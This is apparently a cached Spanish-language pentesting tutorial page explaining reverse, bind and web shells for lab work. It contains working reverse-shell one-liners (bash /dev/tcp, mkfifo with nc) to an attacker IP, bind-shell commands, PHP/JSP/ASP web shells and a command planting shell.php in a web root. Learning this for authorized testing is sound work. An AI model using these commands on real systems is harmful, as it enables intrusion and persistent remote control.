@@ -1,0 +1,141 @@
+I"S2<p>Al comprometer un sistema y explotar una vulnerabilidad para ejecutar comandos de forma remota en los objetivos comprometidos, necesitamos un método de comunicación con el sistema; de
+forma que no tengamos que “reexplotar” la misma vulnerabilidad cada vez que queramos ejecutar un comando. Por lo tanto, precisamos de una conexión fiable y directa al terminal del
+sistema.</p>
+
+<p>Una manera de conectar a un sistema comprometido es a través de los protocolos de red, como SSH (Linux) o WinRM (Windows). Debido a que estos protocolos requieren credenciales de inicio
+de sesión, necesitaríamos ejecutar comandos de antemano para ganar acceso a ellos.</p>
+
+<p>La otra manera de conseguir Ejecución Remota de Código (RCE) es mediante los intérpretes de comandos (<em>shells</em>).<br />
+Como ya vimos, hay 3 tipos principales de intérpretes de comandos:</p>
+<ul>
+  <li><em>Reverse Shell</em> –&gt; Se conecta de vuelta a nuestro sistema y nos da el control a través de una conexión inversa</li>
+  <li><em>Bind Shell</em> —–&gt; Espera a que nos conectemos y nos proporciona el control cuando lo hemos hecho</li>
+  <li><em>Web Shell</em> ——&gt; Se comunica a través de un servidor <em>web</em>, acepta nuestros comandos a través de parámetros HTTP, los ejecuta e imprime la salida<br />
+Vamos a adentrarnos en cada uno de estos intérpretes.</li>
+</ul>
+
+<h3 id="intérprete-inverso"><a href="#header-1"></a>Intérprete inverso</h3>
+
+<p>Es el tipo más común, el más rápido y más sencillo para obtener acceso a un objetivo comprometido. Una vez encontramos una vulnerabilidad que permite ejecución remota de código en el
+objetivo, nos ponemos en modo de escucha con <code class="language-plaintext highlighter-rouge">netcat</code> en un puerto específico. Acto seguido, podemos ejecutar un comando de intérprete inverso que conecte el intérprete remoto del
+sistema a nuestra escucha por <code class="language-plaintext highlighter-rouge">netcat</code>, consiguiendo una conexión inversa sobre el sistema remoto.</p>
+
+<h4 id="escucha-por-netcat"><a href="#header-2"></a>Escucha por Netcat</h4>
+
+<p>Haremos:<br />
+<code class="language-plaintext highlighter-rouge">nc -lvnp &lt;puerto&gt;</code></p>
+
+<p>Parámetros:</p>
+<ul>
+  <li>-l ——&gt; Modo de escucha, esperando una conexión hacia nosotros</li>
+  <li>-v ——&gt; Modo detallado, para saber cuándo recibimos una conexión</li>
+  <li>-n ——&gt; Desactivar resolución DNS y conectar sólo desde/a IPs, para acelerar la conexión</li>
+  <li>-p 1234 -&gt; Número del puerto que <code class="language-plaintext highlighter-rouge">netcat</code> escucha y dónde se debe enviar la conexión inversa</li>
+</ul>
+
+<h4 id="ip-de-conexión"><a href="#header-3"></a>IP de conexión</h4>
+
+<p>Primero debemos encontrar la IP de nuestro sistema para enviarnos una conexión inversa:<br />
+<code class="language-plaintext highlighter-rouge">ip a</code><br />
+En HTB nos suele interesar dónde pone <code class="language-plaintext highlighter-rouge">tun0</code>, ya que es la red a la que nos hemos conectado mediante nuestra Red Privada Virtual (VPN).<br />
+En un test de penetración real, quizá estemos conectados ya a la misma red o quizá sea un test externo, por lo que deberíamos conectar desde el ‘eth0’ o similar.</p>
+
+<h4 id="comando-de-intérprete-inverso"><a href="#header-4"></a>Comando de Intérprete Inverso</h4>
+
+<p>El comando a ejecutar depende del SO del objetivo y de a qué aplicaciones y comandos podamos acceder. Los siguientes comandos suelen ser fiables para ganar una conexión inversa:<br />
+<code class="language-plaintext highlighter-rouge">bash -c 'bash -i &gt;&amp; /dev/TCP/&lt;IP&gt;/&lt;puerto&gt; 0&gt;&amp;1'</code> –&gt; Linux<br />
+<code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;Puerto&gt; &gt; /tmp/f</code> –&gt; Linux<br />
+El caso de la powershell (Windows) es demasiado extenso como para que tenga sentido pegarlo aquí, así que páginas como <em>PayloadsAllTheThings</em> nos serán de ayuda para esos casos.</p>
+
+<p>Al recivir la conexión en el modo escucha de <code class="language-plaintext highlighter-rouge">netcat</code>, podemos escribir comandos y recibir la respuesta en nuestra máquina. Al usar un <em>Reverse Shell</em>, es importante tener en cuenta
+su fragilidad: en caso de parar el comando del intérprete inverso o perder la conexión por cualquier motivo, deberemos repetir el proceso inicial.</p>
+
+<h3 id="intérprete-enlazado"><a href="#header-5"></a>Intérprete enlazado</h3>
+
+<p>De forma contraria al intérprete inverso, somos nosotros quienes hemos de conectarnos al puerto en escucha del objetivo. Al ejecutar un comando de intérprete enlazado, empezará
+la escucha en un puerto del objetivo (con su intérprete enlazado a este). Tendremos que conectarnos a ese puerto mediante <code class="language-plaintext highlighter-rouge">netcat</code> y ganaremos el control a través de un intérprete
+en ese sistema.</p>
+
+<h4 id="comando-de-intérprete-enlazado"><a href="#header-6"></a>Comando de Intérprete Enlazado</h4>
+
+<p>De nuevo hay comandos que nos permiten iniciar un intérprete enlazado desde la máquina objetivo (en este caso nos interesa establecer 0.0.0.0 como IP y 1234 como puerto, para poder
+conectar desde cualquier lugar). Algunos son:<br />
+<code class="language-plaintext highlighter-rouge">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1 -lvp 1234 &gt;/tmp/f</code> &lt;– bash
+<code class="language-plaintext highlighter-rouge">python -c 'exec("""import socket as s, subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,
+a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'</code><br />
+…</p>
+
+<h4 id="conexión-por-netcat"><a href="#header-7"></a>Conexión por Netcat</h4>
+
+<p>Al tener un intérprete de comandos esperándonos en el puerto especificado, podemos conectarnos con:<br />
+<code class="language-plaintext highlighter-rouge">nc &lt;IP&gt; &lt;Puerto(1234)&gt;</code></p>
+
+<p>Al contrario que en un <em>Reverse Shell</em>, si tiramos la conexión por el motivo que sea, podemos reconectarnos de forma inmediata. A no ser, que se detenga el intérprete enlazado o
+se reinicie la máquina remota.</p>
+
+<h4 id="actualizando-la-tty"><a href="#header-8"></a>Actualizando la TTY</h4>
+
+<p>Al conectar a un intérprete con <code class="language-plaintext highlighter-rouge">Netcat</code>, no podremos mover el cursor ni acceder al histórico de comandos. Para poder hacerlo, debemos actualizar el entorno de entrada y salida
+de texto (teletipo). La idea es mapear nuestro TTY con el TTY remoto.<br />
+Hay diversas maneras de hacerlo. Nosotros utilizaremos el método <code class="language-plaintext highlighter-rouge">python/stty</code> en nuestro intérprete:<br />
+<code class="language-plaintext highlighter-rouge">python -c 'import pty; pty.spawn("/bin/bash")'</code><br />
+Después hacemos [CTRL + z] para poner nuestro intérprete en segundo plano y volver a nuestro terminal local, para introducir:<br />
+<code class="language-plaintext highlighter-rouge">stty raw -echo</code><br />
+<code class="language-plaintext highlighter-rouge">fg</code><br />
+Al hacer esto, nuestro intérprete con <code class="language-plaintext highlighter-rouge">netcat</code> volverá a primer plano y mostrará una línea en blanco. Podemos apretar [ENTER] para volver a nuestro intérprete o poner <code class="language-plaintext highlighter-rouge">reset</code> y
+apretar [ENTER] para traerla de nuevo. Una vez hecho esto tendremos nuestro intérprete TTY con todas las funciones.</p>
+
+<p>Puede que observemos que nuestro intérprete no cubre la terminal completa. Para arreglarlo debemos abrir otro intérprete en otro escritorio para comprobar los siguientes valores:<br />
+<code class="language-plaintext highlighter-rouge">echo $TERM</code> Ejemplo de salida: xterm-256color<br />
+<code class="language-plaintext highlighter-rouge">stty size</code>  Ejemplo de salida: 67 318 (filas y columnas)<br />
+Luego en nuestro intérprete <code class="language-plaintext highlighter-rouge">netcat</code> hacemos:<br />
+<code class="language-plaintext highlighter-rouge">export TERM=xterm-256color</code> y<br />
+<code class="language-plaintext highlighter-rouge">stty rows 67 columns 318</code></p>
+
+<p>Finalmente, nos queda un intérprete <code class="language-plaintext highlighter-rouge">netcat</code> igual a nuestro terminal, como si de SSH se tratara.</p>
+
+<h3 id="intérprete-web"><a href="#header-9"></a>Intérprete Web</h3>
+
+<p>Suele ser un <em>script</em> (por ejemplo en <code class="language-plaintext highlighter-rouge">PHP</code> o <code class="language-plaintext highlighter-rouge">ASPX</code>), que nos permite introducir comandos mediante parámetros de peticiones HTTP como <code class="language-plaintext highlighter-rouge">GET</code> o <code class="language-plaintext highlighter-rouge">POST</code>, ejecutan nuestro comando
+e imprimen la salida.</p>
+
+<h4 id="escribiendo-un-intérprete-web"><a href="#header-10"></a>Escribiendo un Intérprete Web</h4>
+
+<p>Primero, necesitamos escribir nuestro intérprete web que admitirá comandos a través de una petición <code class="language-plaintext highlighter-rouge">GET</code>, los ejecutará e imprirá su salida. Lo más típico es un <em>script</em> de una
+línea, corto y fácil de memorizar. Algunos son los siguientes:<br />
+<code class="language-plaintext highlighter-rouge">&lt;?php system($_REQUEST["cmd"]); ?&gt;</code> –&gt; PHP<br />
+<code class="language-plaintext highlighter-rouge">&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;</code> –&gt; JSP<br />
+<code class="language-plaintext highlighter-rouge">&lt;% eval request("cmd") %&gt;</code> –&gt; ASP</p>
+
+<h4 id="subiendo-un-intérprete-web"><a href="#header-11"></a>Subiendo un Intérprete Web</h4>
+
+<p>Una vez tenemos nuestro intérprete web, necesitamos colgarlo en el directorio raíz del anfitrión web para ejecutarlo mediante el navegador web. Esto se puede hacer a través de una
+vulnerabilidad en una funcionalidad de carga de archivos, que nos permite escribir un intérprete en un archivo (<code class="language-plaintext highlighter-rouge">shell.php</code> por ejemplo) y subirlo para luego acceder y ejecutar
+comandos.</p>
+
+<p>De todas formas, si sólo tenemos RCE por un <em>exploit</em>, podemos escribir nuestro intérprete directamente en la raíz web para acceder desde la web. Por lo tanto, el primer paso
+es localizar la raíz web. Las siguientes raíces son las más comunes:</p>
+<ul>
+  <li>Apache —&gt; /var/www/html/</li>
+  <li>Nginx —-&gt; /usr/local/nginx/html/</li>
+  <li>IIS ——&gt; c:\inetpub\wwwroot\</li>
+  <li>XAMPP —-&gt; C:\xampp\htdocs\</li>
+</ul>
+
+<p>Podemos comprovar esos directorios para ver que raíz web está en uso y hacer <code class="language-plaintext highlighter-rouge">echo</code> para escribir nuestro intérprete. Por ejemplo, para un anfitrión Linux con Apache podríamos
+hacer:<br />
+<code class="language-plaintext highlighter-rouge">echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; /var/www/html/shell.php</code></p>
+
+<h4 id="accediendo-al-intérprete-web"><a href="#header-12"></a>Accediendo al Intérprete Web</h4>
+
+<p>Una vez escrito, podemos acceder por el navegador o con <code class="language-plaintext highlighter-rouge">cURL</code>. Podemos visitar la página <code class="language-plaintext highlighter-rouge">shell.php</code> en el sitio comprometido y usar <code class="language-plaintext highlighter-rouge">?cmd=id</code> para ejecutar el comando <code class="language-plaintext highlighter-rouge">id</code>.<br />
+O también hacer <code class="language-plaintext highlighter-rouge">curl http://&lt;IP&gt;:&lt;Puerto&gt;/shell.php?cmd=id</code>.</p>
+
+<p>Esto funciona de igual forma con otros comandos.<br />
+Por un lado, algo muy interesante de un intérprete web, es que nos permite eludir cualquier restricción del cortafuegos que tenga
+el sitio, pues no abrirá una conexión nueva, sino que correrá en el puerto web que use la aplicación. Otro punto a favor es que si se reinicia el anfitrión comprometido, el intérprete
+seguirá en su sitio, por lo que no tendremos que explotarlo de nuevo.</p>
+
+<p>Por otro lado, al no ser interactivo como los anteriores, deberemos cambiar la URL cada vez que ejecutemos un comando. De cualquier forma, en casos extremos, es posible crear un
+<em>script</em> en <code class="language-plaintext highlighter-rouge">Python</code> que nos automatice el proceso, dándonos un intérprete web semi-interactivo en nuestro terminal.</p>
+:ET
